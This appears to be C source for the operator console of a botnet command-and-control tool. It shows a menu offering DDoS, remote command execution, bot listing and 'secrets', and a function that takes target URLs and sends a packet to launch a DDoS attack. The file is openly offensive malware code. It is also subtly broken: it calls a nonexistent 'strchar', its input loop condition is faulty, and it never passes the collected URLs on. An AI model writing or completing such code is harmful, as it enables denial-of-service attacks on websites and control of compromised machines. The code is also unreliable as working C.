#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>

#include "admin.h"

uint8_t input() {
    uint8_t action;

    while (1) {
        printf("\n");
        printf("\033[94m[01] DDOS\033[0m\n");
        printf("\033[94m[02] PING\033[0m\n");
        printf("\033[94m[03] CMD COMMAND\033[0m\n");
        printf("\033[94m[04] GET BOTs\033[0m\n");
        printf("\033[94m[05] SECRETS\033[0m\n");

        printf("\n\033[31m[~]\033[0m \033[32mSelect an option:\033[0m ");
        scanf("%hhu", &action);

        if (action < 1 || action > 5) {
            printf("\033[31mInvalid selection: %d. Try again.\033[0m\n", action);
            continue;
        }

        break;
    }

    return action;
}

void ddos_input(SOCKET sock) {
    char urls[4098];

    printf("\033[33m[!] Now you need to enter an array of urls to which you want to send a DDoS attack. Format: ['https://example.com'] or ['https://example.com', 'https://example.com']\033[0m\n");

    do {
        fgets(urls, sizeof(urls), stdin);

        size_t len = strlen(urls);
        if (len > 0 && urls[len - 1] == '\n') {
            urls[len - 1] = '\0';
        }

        if (strchar(urls, '[') == NULL || strchar(urls, ']') == NULL) {
            printf("\033[33m[!] String format error!\033[0m\n");
        }
    } while (urls != NULL && strchar(urls, '[') != NULL || strchar(urls, ']') != NULL);

    printf("Sending a packet at the beginning of a DDoS attack...\n");
    if (ddos_packet(sock, NULL) < 0) {
        printf("Failed to command ddos send packet\n");
    }
}
